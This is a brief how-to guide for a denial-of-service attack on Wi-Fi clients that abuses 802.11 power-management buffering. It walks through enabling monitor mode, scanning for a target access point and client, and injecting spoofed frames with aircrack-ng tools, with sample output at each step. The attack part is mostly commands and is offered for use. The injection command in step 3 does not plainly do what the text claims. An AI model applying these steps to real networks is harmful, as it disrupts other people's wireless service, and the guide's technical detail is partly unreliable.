# Power Management Attack

## Theory
Power management in 802.11 networks allows client devices to conserve energy by entering a low-power state. The AP buffers packets for sleeping clients and notifies them via the Traffic Indication Map (TIM) in beacon frames.

An attacker can exploit this feature by:
1. Sending spoofed power management frames to force a client into sleep mode.
2. Tricking the AP into buffering packets indefinitely, causing a denial of service (DoS).

This attack disrupts legitimate communication between the client and the AP.

## Tools Required
- `aircrack-ng` suite
- `Wireshark` for packet analysis
- A wireless adapter capable of monitor mode and packet injection

## Steps to Perform Power Management Attack

### Step 1: Enable Monitor Mode
Enable monitor mode on your wireless interface.

```bash
sudo airmon-ng start wlan0
```

Expected output:
```
Interface   Chipset         Driver
wlan0       Atheros         ath9k - [phy0]
                (monitor mode enabled on wlan0mon)
```

### Step 2: Monitor Wireless Traffic
Identify active wireless clients and their associated APs.

```bash
sudo airodump-ng wlan0mon
```

Expected output:
```
 BSSID              PWR  Beacons  #Data, #/s  CH  MB   ENC  CIPHER  AUTH ESSID
 00:14:6C:7E:40:80  -50      100     50    0   6  54e  WPA2  CCMP    PSK  MyWiFi

 STATION            PWR   Rate   Lost  Frames  Probe
 00:25:9C:CF:1C:9E  -40   36e     0     200   MyWiFi
```

### Step 3: Inject Fake Power Management Frames
Send spoofed power management frames to disrupt communication.

```bash
sudo aireplay-ng --interactive -b [AP_MAC] -h [STA_MAC] wlan0mon
```

- `-b [AP_MAC]`: MAC address of the target AP.
- `-h [STA_MAC]`: MAC address of the target client.

Expected output:
```
Interactive packet replay started
```

### Notes
- Use this attack responsibly and only on authorized networks.
- Monitor the impact using `Wireshark` to analyze traffic patterns.
